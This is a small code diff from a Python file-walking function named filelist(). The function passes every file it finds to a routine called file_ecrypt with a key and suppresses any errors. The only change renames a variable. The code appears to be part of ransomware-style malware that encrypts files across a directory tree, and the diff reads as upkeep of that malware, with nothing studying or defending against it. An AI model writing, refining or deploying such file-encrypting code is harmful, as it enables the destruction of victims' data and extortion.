@@ -38,8 +38,8 @@ def filelist():
                 for ext in file.split("."):
                     try:
                         if file.endswith(ext):
-                            ally = os.path.join(root, file)
-                            file_ecrypt(key, ally)
+                            full_path = os.path.join(root, file)
+                            file_ecrypt(key, full_path)
                     except PermissionError:
                         pass
                     except:
